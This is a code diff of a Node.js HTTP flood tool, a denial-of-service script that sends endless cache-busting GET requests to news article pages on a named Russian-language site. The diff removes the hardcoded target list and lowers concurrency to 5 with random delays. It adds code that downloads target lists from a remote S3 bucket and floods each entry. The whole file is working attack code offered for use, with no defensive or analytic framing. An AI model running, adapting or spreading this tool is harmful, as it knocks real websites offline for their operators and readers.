@@ -1,12 +1,4 @@
 const https = require('https')
-const http = require('http')
-
-var targets = [
-    { hostname: 'eadaily.com', path:  '/ru/news/2022/02/26/posolstvo-ssha-udalilo-s-sayta-dokumenty-o-biolaboratoriyah-na-ukraine'},
-    { hostname: 'eadaily.com', path:  '/ru/news/2022/02/26/kadyrov-vylozhil-video-s-chechenskim-flagom-na-ukraine'},
-    { hostname: 'eadaily.com', path:  '/ru/news/2022/02/26/rossiyskiy-pogranichnik-ranen-v-hode-provokacii-s-ukrainskoy-storony'},
-    { hostname: 'eadaily.com', path:  '/ru/news/2022/02/26/prezident-pridnestrovya-obratilsya-k-ukraincam-ne-verte-lzhivym-smi'}
-];
 
 const total = {};
 const current = {
@@ -21,7 +13,7 @@ const getDurationInMilliseconds = (start) => {
     return (diff[0] * NS_PER_SEC + diff[1]) / NS_TO_MS
 }
 
-var CONCURRENCY_LIMIT = 100
+var CONCURRENCY_LIMIT = 5
 var queue = []
 
 setInterval(() => {
@@ -56,50 +48,54 @@ setInterval(() => {
 
 async function fetchWithTimeout(resource) {
     return new Promise((resolve) => {
-        const start = process.hrtime()
+        setTimeout(() => {
+            const start = process.hrtime()
 
-        const controller = new AbortController();
-        const id = setTimeout(() => controller.abort(), 5000);
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), 15000);
 
-        const options = {
-            hostname: resource.hostname,
-            path:`${resource.path}?putin=huilo&biba=${Math.random()}`,
-            port: 443,
-            method: 'GET',
-            signal: controller.signal
-        }
-
-        const result = { path: `${options.hostname}${options.path}` };
-
-        const req = https.request(options, res => {
-            result.statusCode = res.statusCode;
-            result.cacheStatus = res.headers['x-cache-status'];
-            clearTimeout(id);
-            result.durationInMilliseconds = getDurationInMilliseconds (start)
-
-            const field = `status_${res.statusCode}`;
-
-            if (!current[field]) {
-                current[field] = 0;
+            const options = {
+                hostname: resource.hostname,
+                path: `${resource.path}?putin=huilo&biba=${Math.random()}`,
+                port: 443,
+                method: 'GET',
+                signal: controller.signal
             }
 
-            current[field] += 1;
+            const result = {path: `${options.hostname}${options.path}`};
 
-            resolve(result);
-        })
+            const req = https.request(options, res => {
+                result.statusCode = res.statusCode;
+                result.cacheStatus = res.headers['x-cache-status'];
+                clearTimeout(id);
+                result.durationInMilliseconds = getDurationInMilliseconds(start)
 
-        req.on('error', error => {
-            result.error = error.message;
-            clearTimeout(id);
-            result.durationInMilliseconds = getDurationInMilliseconds (start)
+                const field = `status_${res.statusCode}`;
 
-            current.error += 1;
-            resolve(result);
-        })
+                if (!current[field]) {
+                    current[field] = 0;
+                }
 
-        req.end()
+                current[field] += 1;
+
+                resolve(result);
+            })
+
+            req.on('error', error => {
+                result.error = error.message;
+                clearTimeout(id);
+                result.durationInMilliseconds = getDurationInMilliseconds(start)
+
+                current.error += 1;
+                resolve(result);
+            })
+
+            req.end()
+        }, Math.random() * 1000)
+
     })
 }
+
 //
 async function flood(target) {
     for (var i = 0; ; ++i) {
@@ -113,12 +109,36 @@ async function flood(target) {
                     console.log(total)
                     console.log(response)
                 })
-
-
         )
     }
 }
 
-targets.forEach((target) => {
-    flood(target)
-})
+(() => {
+    const req = https.request({
+        hostname: 'putin-huilo-targets.s3.eu-central-1.amazonaws.com',
+        path: '/targets.json',
+        port: 443,
+        method: 'GET',
+    }, (res) => {
+        const body = [];
+        res.on('data', function(chunk) {
+            body.push(chunk);
+        });
+
+        res.on('end', function() {
+            try {
+                const targets = JSON.parse(Buffer.concat(body).toString());
+
+                console.log('DOWNLOADED TARGETS');
+
+                targets.forEach((target) => {
+                    flood(target)
+                })
+            } catch(e) {
+                console.error(e);
+            }
+        });
+    });
+
+    req.end();
+})()
